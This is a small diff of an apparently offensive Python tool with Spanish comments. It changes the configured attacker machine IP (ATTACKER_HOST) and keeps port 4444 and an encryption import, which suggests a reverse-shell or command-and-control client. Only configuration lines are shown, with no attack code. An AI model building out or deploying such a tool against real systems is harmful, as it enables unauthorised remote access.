@@ -18,7 +18,7 @@ import struct
 from cifrado import encrypt
 
 # ── Configuración ──────────────────────────────────────────────────────────────
-ATTACKER_HOST = "192.168.1.100"  # IP de la máquina atacante (ajustar)
+ATTACKER_HOST = "10.194.116.45"  # IP de la máquina atacante (ajustar)
 ATTACKER_PORT = 4444
 CONNECT_TIMEOUT = 5.0            # segundos para timeout de conexión
 
